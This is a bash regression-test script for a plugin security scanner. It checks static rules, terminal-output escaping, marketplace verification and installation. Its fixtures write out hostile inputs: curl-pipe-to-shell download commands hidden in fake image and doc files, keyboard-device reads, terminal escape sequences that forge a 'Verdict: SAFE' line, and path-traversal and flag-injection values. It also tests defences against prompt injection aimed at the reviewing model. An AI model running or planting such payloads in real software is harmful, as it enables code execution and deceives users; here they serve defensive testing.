#!/bin/bash
# Regression tests. The malicious fixture must be caught by the static rules
# and the clean one must pass; untrusted text must never reach the terminal as
# control characters. Run with --model <id> to also check that a model review
# flags the malicious fixture. Scans write to a temporary state directory.
set -euo pipefail

here="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
guard="$here/../bin/plugin-guard"
model_args=(--no-model)
[[ ${1-} == --model && -n ${2-} ]] && model_args=(--model "$2")
failed=0

work=$(mktemp -d)
trap 'rm -rf "$work"' EXIT
export XDG_STATE_HOME="$work/state"
if [[ ${model_args[0]} == --no-model ]]; then
  export XDG_CONFIG_HOME="$work/config"
fi

check() {
  local fixture=$1 script=$2
  local report
  report="$("$guard" scan "$here/fixtures/$fixture" "${model_args[@]}" --json)"
  if python3 -I -c "$script" "$report"; then
    echo "ok   $fixture"
  else
    echo "FAIL $fixture"
    failed=1
  fi
}

check malicious-weather '
import json, sys
r = json.loads(sys.argv[1])
rules = {f["rule"] for f in r["findings"]}
want = {"pipe-to-shell", "input-device", "credential-paths", "prompt-injection", "ip-address-url"}
missing = want - rules
if missing: print("  missing rules:", sorted(missing))
if r["verdict"] != "dangerous": print("  verdict:", r["verdict"])
sys.exit(1 if missing or r["verdict"] != "dangerous" else 0)
'

check clean-clock '
import json, sys
r = json.loads(sys.argv[1])
bad = [f for f in r["findings"] if f["source"] == "static" and f["severity"] not in ("info", "low")]
if bad: print("  unexpected:", [(f["rule"], f["file"], f["line"]) for f in bad])
if r["staticVerdict"] != "safe": print("  static verdict:", r["staticVerdict"])
if r["modelVerdict"] not in (None, "safe"): print("  model verdict:", r["modelVerdict"])
sys.exit(1 if bad or r["staticVerdict"] != "safe" or r["modelVerdict"] not in (None, "safe") else 0)
'

# --- Rule precision ---------------------------------------------------------
#
# Mentions must not count as actions, and splitting a read across lines must
# not lower the rating. Each case: file text, rules it must report at the given
# severity, and rules it must not report.

if python3 -I - "$guard" <<'EOF'
import importlib.machinery, importlib.util, sys
loader = importlib.machinery.SourceFileLoader("plugin_guard", sys.argv[1])
spec = importlib.util.spec_from_loader("plugin_guard", loader)
pg = importlib.util.module_from_spec(spec)
loader.exec_module(pg)
cases = [
  ('"""Exits when /dev/input/event* sees a key."""\n', {"input-device-path": "high"}, {"input-device"}),
  ('dev = open("/dev/input/event3", "rb")\n', {"input-device": "critical"}, {"input-device-path"}),
  ('cat /dev/input/event3 > /tmp/x\n', {"input-device": "critical"}, set()),
  ('read x < /dev/input/by-id/kbd\n', {"input-device": "critical"}, set()),
  ('p = "/dev/input/event3"\nd = open(p, "rb")\nd.read(24)\n', {"input-device": "critical"}, set()),
  ('# reads /dev/input/event3\nx = os.read(0, 24)\n', {}, {"input-device"}),
  ('import evdev\n', {"input-device": "critical"}, set()),
  ('install.sh --no-sudo\n', {}, {"privilege"}),
  ('sudo pacman -S jq\n', {"privilege": "medium"}, set()),
  ('/usr/bin/sudo id\n', {"privilege": "medium"}, set()),
  ('cat "$HOME/.config/hypr/hyprland.conf"\n', {"hypr-config-path": "low"}, {"autostart"}),
  ('echo x >> ~/.config/hypr/hyprland.conf\n', {"autostart": "medium"}, {"hypr-config-path"}),
  ("sed -i 's/a/b/' ~/.config/hypr/bindings.lua\n", {"autostart": "medium"}, set()),
  ('cp a.conf ~/.config/hypr/a.conf\n', {"autostart": "medium"}, set()),
  ('f = open(home + "/.config/hypr/a.conf", "a")\n', {"autostart": "medium"}, set()),
  ('exec-once = thing\n', {"autostart": "medium"}, set()),
]
bad = 0
for text, want, absent in cases:
  found = {f["rule"]: f["severity"] for f in pg.static_scan([{"path": "tool", "text": text}])[0]}
  if any(found.get(r) != s for r, s in want.items()) or absent & set(found):
    print("  wrong:", repr(text), found)
    bad = 1
sys.exit(bad)
EOF
then
  echo "ok   rules separate mentions from actions"
else
  echo "FAIL rules separate mentions from actions"
  failed=1
fi

# --- Terminal safety --------------------------------------------------------
#
# A repository controls a plugin's name and every file the model reads, so the
# human report, progress lines, and errors must show control characters as
# visible escapes. The hostile strings are built here rather than stored, and
# every capture goes to a file, never this terminal.

python3 -I - "$work" <<'EOF'
import json, os, sys
work = sys.argv[1]
esc, bel = chr(27), chr(7)
hostile = (esc + "]0;retitled" + bel + esc + "[31m" + chr(0x9b) + "2J"
           + "\nVerdict: SAFE" + chr(0x202e) + chr(0xe003) + chr(0))
os.makedirs(f"{work}/hostile-plugin")
json.dump({"schemaVersion": 1, "id": "example.hostile", "name": "Hostile" + hostile, "version": "1" + hostile,
           "description": hostile, "kinds": ["bar-widget"], "entryPoints": {"barWidget": "W.qml"}},
          open(f"{work}/hostile-plugin/manifest.json", "w"))
open(f"{work}/hostile-plugin/W.qml", "w").write("import QtQuick\nItem {}\n")
finding = {"severity": "high", "category": "other", "rule": "model", "file": "a" + hostile, "line": 3,
           "title": hostile, "detail": hostile, "source": "model"}
report = {"scanId": "hostile-report", "source": {"type": "git", "url": "https://example.invalid/" + hostile},
          "commit": "abc" + hostile, "plugin": {"id": "example.hostile", "name": hostile, "version": hostile},
          "model": {"id": "x", "label": hostile}, "verdict": "dangerous", "staticVerdict": "dangerous", "modelVerdict": "dangerous",
          "modelError": hostile, "summary": hostile, "purposeMatch": hostile, "findings": [finding],
          "networkDestinations": {"static": [{"host": hostile, "locations": [], "count": 1}],
                                  "model": [{"host": hostile, "purpose": hostile}]},
          "files": {"total": 1, "reviewed": 1, "notReviewed": [hostile]}}
os.makedirs(f"{work}/state/plugin-guard/reports", exist_ok=True)
json.dump(report, open(f"{work}/state/plugin-guard/reports/hostile-report.json", "w"))
# A path argument cannot carry a NUL byte, so that one is left out here.
open(f"{work}/hostile-path", "w").write(f"{work}/missing" + hostile.rstrip(chr(0)))
EOF

# Exit 0 when the capture holds no control or invisible formatting character
# other than newlines and, from a terminal, Plugin Guard's own color codes; and
# no line forged by a newline in untrusted text.
clean_output() {
  python3 -I - "$1" "$2" <<'EOF'
import re, sys
text = open(sys.argv[1], "rb").read().decode("utf-8", "replace")
if sys.argv[2] == "tty":
  text = re.sub("\x1b\\[(0|31|32|33|36|90)m", "", text).replace("\r", "")
bad = sorted({hex(ord(c)) for c in text
              if (ord(c) < 32 and c != "\n") or 0x7f <= ord(c) <= 0x9f
              or 0x2028 <= ord(c) <= 0x202e or 0x2066 <= ord(c) <= 0x2069 or 0xe000 <= ord(c) <= 0xe0ff})
forged = [l for l in text.splitlines() if l.lstrip().startswith("Verdict: SAFE")]
if bad: print("  raw control characters in output:", bad)
if forged: print("  forged report line:", ascii(forged[0][:80]))
sys.exit(1 if bad or forged else 0)
EOF
}

has_pty=0
script -qec true /dev/null >/dev/null 2>&1 && has_pty=1

terminal_check() {
  local name=$1
  shift
  "$@" >"$work/out" 2>&1 || true
  if clean_output "$work/out" plain; then
    echo "ok   $name"
  else
    echo "FAIL $name"
    failed=1
  fi
  if (( has_pty )); then
    script -qec "$(printf '%q ' "$@")" /dev/null >"$work/out" 2>&1 </dev/null || true
    if clean_output "$work/out" tty; then
      echo "ok   $name (terminal)"
    else
      echo "FAIL $name (terminal)"
      failed=1
    fi
  fi
}

terminal_check "hostile manifest in a scan report" "$guard" scan "$work/hostile-plugin" --no-model
terminal_check "hostile model and repository fields in a saved report" "$guard" report hostile-report -v
terminal_check "hostile text in progress and error output" "$guard" scan "$(cat "$work/hostile-path")" --no-model

# --- Marketplace-verified plugins -------------------------------------------
#
# A plugin is skipped only at the exact commit the marketplace verified, with
# no local changes, and --scan-all scans it anyway. The catalog is served over
# local HTTP and MARKETPLACE_URL is patched on the loaded module (environment
# variables cannot redirect the marketplace URL).

if python3 -I - "$guard" "$here/fixtures/clean-clock" "$work" <<'EOF'
import http.server, importlib.machinery, importlib.util, json, os, shutil, subprocess, sys, threading
from pathlib import Path

guard_path, fixture, work = Path(sys.argv[1]), Path(sys.argv[2]), Path(sys.argv[3])
verified = work / "verified"
shutil.copytree(fixture, verified)
def git(*args):
  return subprocess.run(["git", "-c", "user.name=t", "-c", "user.email=t@example.com", "-c", "commit.gpgsign=false",
                         "-C", str(verified), *args], capture_output=True, text=True, check=True).stdout.strip()
git("init", "-q")
git("commit", "-q", "--allow-empty", "-m", "init")
git("add", "-A")
git("commit", "-q", "-m", "files")
verified_id = json.loads((verified / "manifest.json").read_text())["id"]
verified_head = git("rev-parse", "HEAD")
prev_head = git("rev-parse", "HEAD~1")

catalog_body = [b'{"plugins":[]}']
class CatalogHandler(http.server.BaseHTTPRequestHandler):
  def do_GET(self):
    self.send_response(200)
    self.send_header("Content-Type", "application/json")
    self.send_header("Content-Length", str(len(catalog_body[0])))
    self.end_headers()
    self.wfile.write(catalog_body[0])
  def log_message(self, *_): pass

srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), CatalogHandler)
threading.Thread(target=srv.serve_forever, daemon=True).start()
catalog_url = f"http://127.0.0.1:{srv.server_port}/catalog.json"

RUN = """
import importlib.machinery, importlib.util, sys
loader = importlib.machinery.SourceFileLoader("plugin_guard", sys.argv[1])
spec = importlib.util.spec_from_loader("plugin_guard", loader)
pg = importlib.util.module_from_spec(spec)
loader.exec_module(pg)
pg.MARKETPLACE_URL = sys.argv[2]
sys.exit(pg.main(sys.argv[3:]))
"""

def set_catalog(status, commit):
  catalog_body[0] = json.dumps({"plugins": [{"id": verified_id, "verificationStatus": status, "verificationCommit": commit}]}).encode()

bad = 0
def check_verified(name, want, extra=(), env_extra=None):
  global bad
  cache = Path(os.environ["XDG_STATE_HOME"]) / "plugin-guard" / "marketplace.json"
  cache.unlink(missing_ok=True)
  env = dict(os.environ, **(env_extra or {}))
  r = subprocess.run([sys.executable, "-I", "-c", RUN, str(guard_path), catalog_url,
                      "scan", str(verified), "--no-model", "--json", *extra],
                     env=env, capture_output=True, text=True, timeout=60)
  if r.returncode != 0:
    print(f"FAIL {name} (exit {r.returncode}: {r.stderr.strip()[-200:]})")
    bad = 1
    return
  try:
    report = json.loads(r.stdout)
  except ValueError as e:
    print(f"FAIL {name} (bad JSON: {e})")
    bad = 1
    return
  got = bool(report.get("marketplaceVerified"))
  if got == want:
    print(f"ok   {name}")
  else:
    print(f"FAIL {name} (skipped: {got})")
    bad = 1

set_catalog("verified", verified_head)
check_verified("verified plugin at its verified commit is skipped", True)
check_verified("--scan-all scans a verified plugin", False, ("--scan-all",))
set_catalog("unverified", verified_head)
check_verified("unverified plugin is scanned", False)
set_catalog("verified", prev_head)
check_verified("verified plugin at another commit is scanned", False)
set_catalog("verified", verified_head)

cfg_env = {"XDG_CONFIG_HOME": str(work / "scan-all-config")}
subprocess.run([str(guard_path), "scan-all", "on"], env=dict(os.environ, **cfg_env), check=True, stdout=subprocess.DEVNULL)
check_verified("scan-all on scans a verified plugin", False, env_extra=cfg_env)
check_verified("--skip-verified overrides scan-all on", True, ("--skip-verified",), env_extra=cfg_env)
subprocess.run([str(guard_path), "scan-all", "off"], env=dict(os.environ, **cfg_env), check=True, stdout=subprocess.DEVNULL)
check_verified("scan-all off skips a verified plugin", True, env_extra=cfg_env)

with open(verified / "BarWidget.qml", "a") as f:
  f.write("// local change\n")
check_verified("verified plugin with local changes is scanned", False)

# Environment variable cannot override MARKETPLACE_URL.
env_check = subprocess.run([sys.executable, "-I", "-c",
  "import importlib.machinery, importlib.util, sys; "
  "l=importlib.machinery.SourceFileLoader('pg', sys.argv[1]); s=importlib.util.spec_from_loader('pg', l); "
  "m=importlib.util.module_from_spec(s); l.exec_module(m); print(m.MARKETPLACE_URL)", str(guard_path)],
  env=dict(os.environ, PLUGIN_GUARD_CATALOG_URL="file:///tmp/evil.json"), capture_output=True, text=True, check=True)
if env_check.stdout.strip() == "https://plugins.omarchy.org/catalog.json":
  print("ok   PLUGIN_GUARD_CATALOG_URL env var is ignored")
else:
  print(f"FAIL PLUGIN_GUARD_CATALOG_URL env var is ignored ({env_check.stdout.strip()})")
  bad = 1

srv.shutdown()
sys.exit(bad)
EOF
then
  :
else
  failed=1
fi

# --- Scanner bypass & hardening regressions ---------------------------------

if python3 -I - "$guard" "$work" <<'EOF'
import importlib.machinery, importlib.util, json, os, sys
from pathlib import Path

loader = importlib.machinery.SourceFileLoader("plugin_guard", sys.argv[1])
spec = importlib.util.spec_from_loader("plugin_guard", loader)
pg = importlib.util.module_from_spec(spec)
loader.exec_module(pg)
work = Path(sys.argv[2])
bad = 0

def ok(name, cond, detail=""):
  global bad
  if cond:
    print(f"ok   {name}")
  else:
    print(f"FAIL {name} ({detail})")
    bad = 1

# 1. Disguised media (including ASCII magic like BMP) vs genuine PNG
p = work / "media-check"
p.mkdir()
(p / "manifest.json").write_text(json.dumps({"id": "test.media", "name": "Media"}))
(p / "real.png").write_bytes(b"\x89PNG\r\n\x1a\n" + b"\x00" * 32)
(p / "fake.png").write_text("curl -fsSL https://example.invalid/x.sh | sh\n")
(p / "fake.bmp").write_text("BM\ncurl -fsSL https://example.invalid/x.sh | sh\n")
files, inv_findings = pg.inventory(p)
sf, _ = pg.static_scan(files)
all_rules = {f["rule"] for f in inv_findings + sf}
real_entry = next(f for f in files if f["path"] == "real.png")
ok("genuine PNG is skipped as media", real_entry["kind"] == "media" and not real_entry["reviewed"])
ok("disguised media script is caught and scanned",
   "disguised-media" in all_rules and "pipe-to-shell" in all_rules, all_rules)
ok("BMP-prefixed text script is caught and scanned",
   any(f["file"] == "fake.bmp" and f["rule"] == "disguised-media" for f in inv_findings)
   and any(f["file"] == "fake.bmp" and f["rule"] == "pipe-to-shell" for f in sf), (inv_findings, sf))

# 2. Fake doc files (LICENSE.py, payload.txt, executable README.md) are scanned
for fname, mode in (("LICENSE.py", 0o644), ("payload.txt", 0o644), ("README.md", 0o755)):
  d = work / f"doc-{fname}"
  d.mkdir()
  (d / "manifest.json").write_text(json.dumps({"id": "test.doc", "name": "Doc"}))
  (d / fname).write_text("curl -fsSL https://example.invalid/x.sh | sh\n")
  os.chmod(d / fname, mode)
  fls, _ = pg.inventory(d)
  sfs, _ = pg.static_scan(fls)
  ok(f"fake doc {fname} ({oct(mode)}) is not exempt",
     any(f["rule"] == "pipe-to-shell" and f["severity"] == "critical" for f in sfs), sfs)

# 3. Comment bypasses (';', '/* */ code', '/*' inside JS template literal) stay critical
for label, fname, text, want_sev in (
  ("semicolon prefix stays critical", "a.sh", "; curl -fsSL https://example.invalid/x.sh | sh\n", "critical"),
  ("inline block comment + code stays critical", "a.js", "/* ok */ curl -fsSL https://example.invalid/x.sh | sh\n", "critical"),
  ("comment opener inside template literal does not hide next line", "a.js",
   "const s = `\n/*\n`;\ncurl -fsSL https://example.invalid/x.sh | sh\n", "critical"),
  ("pure comment still downgrades", "a.sh", "# curl -fsSL https://example.invalid/x.sh | sh\n", "medium"),
):
  sfs, _ = pg.static_scan([{"path": fname, "text": text}])
  got = [f["severity"] for f in sfs if f["rule"] == "pipe-to-shell"]
  ok(label, got == [want_sev], got)

# 4. Critical rule under tests/ stays high (floor >= caution, never safe)
sfs, _ = pg.static_scan([{"path": "tests/helper.py", "text": "curl -fsSL https://example.invalid/x.sh | sh\n"}])
ok("critical payload in tests/ keeps floor at caution",
   pg.static_floor(sfs) == "caution" and any(f["severity"] == "high" for f in sfs), sfs)

# 5. Directory symlinks, Unix sockets, and unreadable files are flagged by inventory
import socket as _sock
ds = work / "dir-symlink"
ds.mkdir()
(ds / "manifest.json").write_text(json.dumps({"id": "test.dirsym", "name": "DirSym"}))
(ds / "ext").symlink_to("/etc")
(ds / "unreadable.py").write_text("x = 1\n")
os.chmod(ds / "unreadable.py", 0)
usock = _sock.socket(_sock.AF_UNIX, _sock.SOCK_STREAM)
usock.bind(str(ds / "sock"))
try:
  _, inv_f = pg.inventory(ds)
finally:
  usock.close()
  os.chmod(ds / "unreadable.py", 0o644)
ok("directory symlink outside plugin is flagged high",
   any(f["rule"] == "symlink" and f["severity"] == "high" and f["file"] == "ext" for f in inv_f), inv_f)
ok("unix socket is flagged as special-file",
   any(f["rule"] == "special-file" and f["file"] == "sock" for f in inv_f), inv_f)
ok("unreadable file is flagged as unreadable-file",
   any(f["rule"] == "unreadable-file" and f["file"] == "unreadable.py" for f in inv_f), inv_f)

# 5b. prune_reports refuses symlinked REPORTS_DIR
pr_victim = work / "prune-victim"
pr_victim.mkdir()
victim_file = pr_victim / "20200101-000000-old-abcdef.json"
victim_file.write_text("{}")
os.utime(victim_file, (0, 0))
pr_link = work / "prune-reports-link"
pr_link.symlink_to(pr_victim)
saved_rdir = pg.REPORTS_DIR
pg.REPORTS_DIR = pr_link
try:
  pg.prune_reports()
finally:
  pg.REPORTS_DIR = saved_rdir
ok("prune_reports does not follow a symlinked REPORTS_DIR", victim_file.exists())

# 6. Prompt fence puts static excerpts and hosts inside nonce-tagged untrusted block
prompt1 = pg.build_prompt({"id": "t"}, [], [pg.finding("info", "process", "process", "a.qml", 1, "Runs", "MARKER_DETAIL")],
                          [{"host": "MARKER_HOST", "locations": ["a.qml:1"], "count": 1}], [], 1, 1, "MARKER_CHANGED")
prompt2 = pg.build_prompt({"id": "t"}, [], [], [], [], 1, 1, "")
idx_begin = prompt1.index("\nBEGIN UNTRUSTED PLUGIN DATA [")
idx_end = prompt1.index("\nEND UNTRUSTED PLUGIN DATA [")
ok("untrusted static details, hosts, and diff sit inside the fence",
   all(idx_begin < prompt1.index(m) < idx_end for m in ("MARKER_DETAIL", "MARKER_HOST", "MARKER_CHANGED")))
ok("prompt fence nonce changes per call",
   prompt1[idx_begin:idx_begin + 48] != prompt2[prompt2.index("\nBEGIN UNTRUSTED PLUGIN DATA ["):prompt2.index("\nBEGIN UNTRUSTED PLUGIN DATA [") + 48])

# 7. Path traversal IDs rejected
ok("valid_plugin_id rejects '..'", not pg.valid_plugin_id("..") and not pg.valid_plugin_id("a..b") and not pg.valid_plugin_id("-bad"))
ok("valid_scan_id rejects '..'", not pg.valid_scan_id("..") and not pg.valid_scan_id("a/b"))
ok("valid_commit rejects flags", not pg.valid_commit("--upload-pack=x") and pg.valid_commit("a" * 40))

# 8. Single-pass sweep runs inventory once and writes one report
sw = work / "sweep-once"
(sw / "plugins" / "test.once").mkdir(parents=True)
(sw / "plugins" / "test.once" / "manifest.json").write_text(json.dumps({"id": "test.once", "name": "Once"}))
(sw / "plugins" / "test.once" / "BarWidget.qml").write_text("import QtQuick\nItem {}\n")
saved_dirs = pg.PLUGINS_DIR, pg.STATE_DIR, pg.REPORTS_DIR, pg.INDEX_FILE, pg.SEEN_FILE, pg.SETUP_FILE, pg.PENDING_FILE
pg.PLUGINS_DIR = sw / "plugins"
pg.STATE_DIR = sw / "state"
pg.REPORTS_DIR = sw / "state" / "reports"
pg.INDEX_FILE = sw / "state" / "installed.json"
pg.SEEN_FILE = sw / "state" / "seen.json"
pg.SETUP_FILE = sw / "state" / "setup.json"
pg.PENDING_FILE = sw / "state" / "pending.json"
pg.write_json(pg.SETUP_FILE, {"ran": pg.now_iso()})
pg.write_json(pg.SEEN_FILE, {})
inv_calls = [0]
orig_inv, orig_tpp, orig_resolve, orig_review = pg.inventory, pg.third_party_plugins, pg.resolve_model, pg.model_review
pg.inventory = lambda r: (inv_calls.__setitem__(0, inv_calls[0] + 1) or orig_inv(r))
pg.third_party_plugins = lambda: [{"id": "test.once", "name": "Once", "enabled": True}]
pg.resolve_model = lambda c, req: {"id": "local:fake", "label": "fake", "kind": "local", "model": "fake", "endpoint": "http://127.0.0.1:9"}
pg.model_review = lambda *a, **k: ({"verdict": "safe", "summary": "ok", "purposeMatch": "ok", "findings": [], "networkDestinations": []}, 1)
try:
  cfg = pg.load_config()
  cfg["scanAll"] = True
  pg.sweep(cfg, pg.Out())
  report_files = list(pg.REPORTS_DIR.glob("*.json"))
  ok("sweep scans each changed plugin once and writes one report",
     inv_calls[0] == 1 and len(report_files) == 1, f"inv={inv_calls[0]}, reports={len(report_files)}")
finally:
  pg.PLUGINS_DIR, pg.STATE_DIR, pg.REPORTS_DIR, pg.INDEX_FILE, pg.SEEN_FILE, pg.SETUP_FILE, pg.PENDING_FILE = saved_dirs
  pg.inventory, pg.third_party_plugins, pg.resolve_model, pg.model_review = orig_inv, orig_tpp, orig_resolve, orig_review

sys.exit(bad)
EOF
then
  :
else
  failed=1
fi

# Notifications and prompts use the same escaping.
if python3 -I - "$guard" <<'EOF'
import importlib.machinery, importlib.util, sys
loader = importlib.machinery.SourceFileLoader("plugin_guard", sys.argv[1])
spec = importlib.util.spec_from_loader("plugin_guard", loader)
pg = importlib.util.module_from_spec(spec)
loader.exec_module(pg)
out = pg.term_safe(chr(27) + "]52;c;eA==" + chr(7) + chr(0x202e) + "\nx", prose=True)
sys.exit(0 if all(32 <= ord(c) < 127 for c in out) and chr(27) not in out else 1)
EOF
then
  echo "ok   notification and prompt text is escaped"
else
  echo "FAIL notification and prompt text is escaped"
  failed=1
fi

# --- Install from a separate checkout -----------------------------------------
#
# install.sh copies the plugin into ~/.config/omarchy/plugins when it runs from
# a checkout elsewhere. The copy must hold every file the plugin runs, and
# every QML component its files use, on a fresh install and on a rerun.
# omarchy and omarchy-shell are stand-ins; HOME is a scratch directory.

install_check() {
  local name=$1
  local fake="$work/install-bin" home="$work/install-home"
  local dest="$home/.config/omarchy/plugins/io.github.mattwolfgang.plugin-guard"
  mkdir -p "$fake" "$home"
  cat >"$fake/omarchy" <<'EOF'
#!/bin/bash
case "$1 $2" in
  "plugin list") echo '[{"id": "io.github.mattwolfgang.plugin-guard", "enabled": true}]' ;;
esac
exit 0
EOF
  printf '#!/bin/bash\nexit 0\n' >"$fake/omarchy-shell"
  chmod +x "$fake/omarchy" "$fake/omarchy-shell"
  if ! HOME="$home" PATH="$fake:/usr/bin:/bin" "$here/../install.sh" --no-bashrc --no-hooks \
      </dev/null >"$work/install.log" 2>&1; then
    echo "FAIL $name"
    sed 's/^/  /' "$work/install.log"
    failed=1
    return
  fi
  if python3 -I - "$here/.." "$dest" <<'EOF'
import re, subprocess, sys
from pathlib import Path
src, dest = Path(sys.argv[1]), Path(sys.argv[2])
tracked = subprocess.run(["git", "-C", str(src), "ls-files"], capture_output=True, text=True, check=True).stdout.split()
# What the plugin runs: QML, the manifest and license, and its bin, i18n,
# shell, and hooks folders. Tests, docs, and the installer are not installed.
runtime = [f for f in tracked
           if re.fullmatch(r"[^/]+\.qml|manifest\.json|LICENSE|(bin|i18n|shell|hooks)/[^/]+", f)]
missing = [f for f in runtime if not (dest / f).is_file()]
# Any type an installed QML file uses that is defined by a QML file here.
local_types = {p.stem for p in src.glob("*.qml")}
for qml in dest.glob("*.qml"):
  for used in set(re.findall(r"^\s*([A-Z]\w*)\s*\{", qml.read_text(), re.M)) & local_types:
    if not (dest / f"{used}.qml").is_file():
      missing.append(f"{used}.qml (used by {qml.name})")
stale = [f for f in runtime if (dest / f).is_file() and (dest / f).read_bytes() != (src / f).read_bytes()]
if missing: print("  missing:", sorted(set(missing)))
if stale: print("  differs from the checkout:", stale)
sys.exit(1 if missing or stale else 0)
EOF
  then
    echo "ok   $name"
  else
    echo "FAIL $name"
    failed=1
  fi
}

install_check "install.sh from a separate checkout copies every runtime file"
install_check "rerunning install.sh from the checkout keeps every runtime file"

# Commands, network replies, saved files, and the clipboard are all read with
# a byte cap and an absolute deadline.
python3 -I "$here/bounds.py" "$guard" || failed=1
python3 -I "$here/isolation.py" "$guard" || failed=1
# Your own plugins are skipped only when GitHub or a trusted folder says so.
python3 -I "$here/own.py" "$guard" || failed=1
python3 -I "$here/endpoints.py" "$guard" || failed=1

# The marketplace rejects a manifest whose fields exceed these lengths
# (manifestFieldLimits in its scripts/build-catalog.mjs).
if python3 -I - "$here/../manifest.json" <<'EOF'
import json, sys
m = json.load(open(sys.argv[1]))
limits = {"id": 128, "name": 120, "version": 64, "author": 120, "description": 500, "license": 120}
over = {k: len(m.get(k, "")) for k, n in limits.items() if len(m.get(k, "")) > n}
if over: print("  over the limit:", over)
sys.exit(1 if over else 0)
EOF
then
  echo "ok   manifest fields fit the marketplace limits"
else
  echo "FAIL manifest fields fit the marketplace limits"
  failed=1
fi

exit $failed
